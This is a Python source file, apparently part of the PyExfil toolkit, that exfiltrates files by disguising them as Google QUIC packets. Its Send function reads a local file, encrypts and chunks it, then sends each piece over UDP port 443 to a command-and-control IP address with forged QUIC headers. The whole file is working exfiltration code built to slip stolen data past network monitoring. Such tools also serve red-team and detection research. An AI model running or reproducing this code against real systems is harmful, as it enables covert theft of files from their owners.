import zlib
import socket
import struct

from pyexfil.includes.prepare import PrepFile, DEFAULT_KEY


GQUIC_PORT = 443


def _send_one(data, pckt_counter, dest_ip, dest_port=GQUIC_PORT, ccc=None):
	"""
	Send out one packet of data
	:param data: Data to send [str]
	:param pckt_counter: Counter of file/comm [int]
	:param dest_ip: IP [str]
	:param dest_port: Port [int]
	:param ccc: CRC of file [binary]
	:return: [True, Always!]
	"""
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	actual_data = "\x0d"  # Flags - None
	if ccc:
		actual_data += ccc  # CID
	else:
		actual_data += "\x43\x53\x50\x45\x54\x48\x53\x59"
	actual_data += "\x51\x30\x34\x33"  # Version Q304
	actual_data += struct.pack('B', pckt_counter)  # Packet number increment
	actual_data += data  # Payload
	s.sendto(actual_data, (dest_ip, dest_port))
	return True


def Send(file_name, CNC_ip, CNC_port=GQUIC_PORT, key=DEFAULT_KEY):
	"""
	Send a file out (can be used for any communication
	:param file_name: String, path to file
	:param CNC_ip: String, IP
	:param CNC_port: Int, Port
	:param key: String of key
	:return: TRUE FOREVER! VIVA LA REVOLUSION!
	"""
	this_prepObj = PrepFile(
			file_path = file_name,
			kind = 'binary',
			max_size = 128,
			enc_key = key
	)
	crc = hex(zlib.crc32(open(file_name, 'rb').read()))
	_send_one(data = this_prepObj['Packets'][0], pckt_counter = 0, dest_ip = CNC_ip, dest_port = CNC_port, ccc = crc)
	i = 1
	for pkt in this_prepObj['Packets'][1:]:
		_send_one(data=pkt, pckt_counter=i, dest_ip=CNC_ip, dest_port=CNC_port)
		i += 1
	return True



